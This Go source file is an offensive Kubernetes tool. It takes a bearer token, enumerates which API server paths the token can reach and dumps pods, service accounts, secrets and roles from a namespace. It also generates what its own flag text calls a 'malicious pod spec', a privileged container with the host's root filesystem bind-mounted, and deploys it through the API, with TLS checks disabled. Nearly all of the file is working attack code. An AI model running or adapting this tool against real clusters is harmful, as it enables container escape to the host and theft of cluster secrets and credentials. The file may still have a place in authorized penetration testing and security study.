package main

import (
  //"bytes"
  "encoding/json"
  "fmt"
  "io"
  "io/ioutil"
  "net/http"
  "flag"
  "crypto/tls"
  "strconv"
  "strings"
)

/*
A thin HTTP request wrapper
*/
func doReq(method string, url string, headers *map[string]string, body io.Reader) (*http.Response, error) {
  client := &http.Client{}
  req, err := http.NewRequest("POST", url, body)
  if err != nil {
    return nil, err
  }

  for k, v := range *headers {
    req.Header.Add(k, v)
  }

  res, err := client.Do(req)
  if err != nil {
    return nil, err
  }
  resBody, _ := ioutil.ReadAll(res.Body)
  fmt.Println(string(resBody))
  defer res.Body.Close()
  return res, err
}

func get(url string, headers *map[string]string) (*http.Response, error) {
  client := &http.Client{}
  req, err := http.NewRequest("GET", url, nil)
  if err != nil {
    return nil, err
  }

  for k, v := range *headers {
    req.Header.Add(k, v)
  }

  res, err := client.Do(req)
  if err != nil {
    return nil, err
  }
  defer res.Body.Close() // we don't care about this, only status code
  return res, err
}

func getJson(
  url string,
  jsonData *interface{},
  headers *map[string]string,
) (*http.Response, error) {
  client := &http.Client{}
  req, err := http.NewRequest("GET", url, nil)
  if err != nil {
    return nil, err
  }

  for k, v := range *headers {
    req.Header.Add(k, v)
  }
  res, err := client.Do(req)
  if err != nil {
    return nil, err
  }
  // make sure the body ReaderCloser gets closed once the func exits
  defer res.Body.Close()

  body, err := ioutil.ReadAll(res.Body)
  if err != nil {
    return nil, err
  }
  json.Unmarshal(body, &jsonData)
  return res, err
}

func panicOnErr(err error) {
  if err != nil {
    panic(err)
  }
}

func fmtJsonMap(m map[string]interface{}, out *string) {
  for k, v := range m {
    // cast k and v to string to be safe
    if w, ok := v.(string); ok {
      *out += k + " -> " + w + "\n"
    }
  }
}

func getPaths(
  url string,
  paths *[]string,
  headers *map[string]string,
) (map[string]int ,error) {
  statuses := make(map[string]int)
  for p := range *paths {
    res, err := get(url + (*paths)[p], headers)
    if err != nil {
      return nil, err
    }
    statuses[(*paths)[p]] = res.StatusCode
  }
  return statuses, nil
}

func podSpec(name string, image string, cmd string, bindPath string) string {
  podStr := `{
  "apiVersion":"v1",
  "kind":"Pod",
  "metadata":{"name":"%s"},
  "spec":{
    "containers":[{
      "name":"%s",
      "image":"%s",
      "command":%s,
      "securityContext":{
  	    "privileged":true
      },
      "volumeMounts":[{
  	    "mountPath":"/mnt/host",
  	    "name":"hostvolume",
  	    "mountPropagation":"Bidirectional"
      }]
    }],
    "volumes":[{
      "name":"hostvolume",
      "hostPath":{
  	    "path":"%s"
      }
    }]
  }
}`
  return fmt.Sprintf(podStr, name, name, image, cmd, bindPath)
}

func main() {
  // Disable SSL security checks
  http.DefaultTransport.
    (*http.Transport).
    TLSClientConfig = &tls.Config{
      InsecureSkipVerify: true,
    }

  urlPtr := flag.String("url", "https://kubernetes.default.svc", "the url of the k8s api server")
  jwtPtr := flag.String("jwt", "", "the token to use for authorization")
  nsPtr := flag.String("ns", "default", "the namespace to try and enumerate")
  dumpPtr := flag.Bool("dump", false, "Dump all the information possible")
  podPtr := flag.Bool("pod", false, "Generate a malicious pod spec in JSON format")
  namePtr := flag.String("name", "", "The name for for the pod spec")
  cmdPtr := flag.String("cmd", "", "The command string for the pod spec")
  imagePtr := flag.String("img", "", "The image for the pod spec")
  deployPtr := flag.Bool("deploy", false, "Attempt to deploy a pod using the k8s api")
  bindPtr := flag.String("bind", "/", "Host dir to bind mount to pod; Default value of /")
  flag.Parse()

  if *podPtr == true {
    podName := *namePtr
    podCmdStr := *cmdPtr
    podImage := *imagePtr
    bindPath := *bindPtr

    errMsg := "\n[!] -name, -cmd, -img required when using -pod"
    if podName == "" || podCmdStr == "" || podImage == "" {
      panic(errMsg)
    }

    podStr := podSpec(podName, podImage, podCmdStr, bindPath)
    fmt.Println(podStr)
    return
  }

  if *deployPtr == true {
    podName := *namePtr
    podCmdStr := *cmdPtr
    podImage := *imagePtr
    bindPath := *bindPtr
    ns := *nsPtr

    // construct the headers map
    headers := map[string]string{
      "Accept": "application/json",
      "Content-Type": "application/json",
    }
    if *jwtPtr != "" {
      *jwtPtr = strings.ReplaceAll(*jwtPtr, "\"", "")
      headers["Authorization"] = "Bearer " + *jwtPtr
    }

    body := podSpec(podName, podImage, podCmdStr, bindPath)
    res, err := doReq("POST", *urlPtr + "/api/v1/namespaces/" + ns + "/pods", &headers, strings.NewReader(body))
    if err != nil {
      panic(err)
    }
    fmt.Println(res)
    return
  }

  headers := map[string]string{
    "Accept": "application/json",
  }
  if *jwtPtr != "" {
    *jwtPtr = strings.ReplaceAll(*jwtPtr, "\"", "")
    //fmt.Println("Bearer " + *jwtPtr)
    headers["Authorization"] = "Bearer " + *jwtPtr
  }

  var jsonData interface{}
  res, err := getJson(*urlPtr + "/version", &jsonData, &headers)
  panicOnErr(err)
  // TODO: pretty print the version info
  if res.StatusCode == 200 {
    var out string
    jsonMap := jsonData.(map[string]interface{})
    fmtJsonMap(jsonMap, &out)
    fmt.Println("[!] k8s version info:")
    fmt.Println(out)
  }

  parsedPaths := false
  //var pathsEnumRes map[string]int
  res, err = getJson(*urlPtr + "/swagger.json", &jsonData, &headers)
  panicOnErr(err)
  if res.StatusCode == 200 {
    var out string
    jsonMap := jsonData.(map[string]interface{})
    fmtJsonMap(jsonMap, &out)
    fmt.Println("[+] got /swagger.json... attempting to enumerate access")
  } else {
    res, err = getJson(*urlPtr + "/openapi/v2", &jsonData, &headers)
    panicOnErr(err)
    if res.StatusCode == 200 {
      fmt.Println("[+] got /openapi/v2... attempting to enumerate access")
      fmt.Println("[+] Using namespace: " + *nsPtr)
      //var out string
      jsonMap := jsonData.(map[string]interface{})
      pathsMap := jsonMap["paths"].(map[string]interface{})
      pathsSlice := make([]string, 0)
      fmt.Println("[!] API Paths")
      // set the namespace in each path where {namespace} is present
      // Ideally we should extract the namespace from the token if it is supplied
      // We can add this later.
      for k := range pathsMap {
        // replace {namespace} with -ns value
        // TODO retool this to go into a slice!
        pathsSlice = append(pathsSlice, strings.Replace(k, "{namespace}", *nsPtr, 1))
      }
      res, err := getPaths(*urlPtr, &pathsSlice, &headers)
      panicOnErr(err)
      parsedPaths = true
      for k, v := range res {
        if v != 403 {
          fmt.Println(k + " -> " + strconv.Itoa(v))
        }
      }
    }
  }

  if *dumpPtr == true && parsedPaths == true {
    /* Try to dump the followoing:
     * - /api/v1/namespaces/{namespace}/pods
     * - /api/v1/namespaces/{namespace}/serviceaccounts
     * - /api/v1/namespaces/{namespace}/secrets
     * - /api/v1/namespaces/{namespace}/roles
    */
    base := "/api/v1/namespaces/" + *nsPtr
    paths := []string{
      base + "/pods",
      base + "/serviceaccounts",
      base + "/secrets",
      base + "/roles",
    }

    for i := range paths {
      var jsonData interface{}
      url := *urlPtr + paths[i]
      _, err := getJson(url, &jsonData, &headers)
      panicOnErr(err)
      fmt.Println("\n[!] Attempting to dump " + paths[i])
      prettyJson, err := json.MarshalIndent(jsonData,"", "    ")
      panicOnErr(err)
      fmt.Println(string(prettyJson))
    }
  }
}
